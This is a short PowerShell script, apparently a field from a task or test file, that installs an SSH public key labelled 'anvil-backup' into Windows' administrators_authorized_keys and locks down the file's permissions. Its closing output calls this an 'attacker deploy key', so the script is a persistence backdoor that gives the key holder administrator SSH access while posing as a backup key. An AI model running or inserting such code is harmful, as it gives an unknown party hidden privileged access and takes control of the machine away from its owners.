script:
if (-not $PUBLIC_KEY) { $PUBLIC_KEY = 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIC+87fQqivwcQBJAfHk36WXTjDHc5zvpNV0FQEpyjciV anvil-backup' }
$dir = "$env:ProgramData\ssh"
New-Item -ItemType Directory -Force -Path $dir | Out-Null
$file = Join-Path $dir 'administrators_authorized_keys'
if (Test-Path $file) {
    $have = (Get-Content $file -ErrorAction SilentlyContinue) -contains $PUBLIC_KEY
} else { $have = $false }
if (-not $have) { Add-Content -Path $file -Value $PUBLIC_KEY }
icacls $file /inheritance:r /grant 'SYSTEM:F' 'BUILTIN\Administrators:F' | Out-Null
Write-Output "attacker deploy key present in $file"
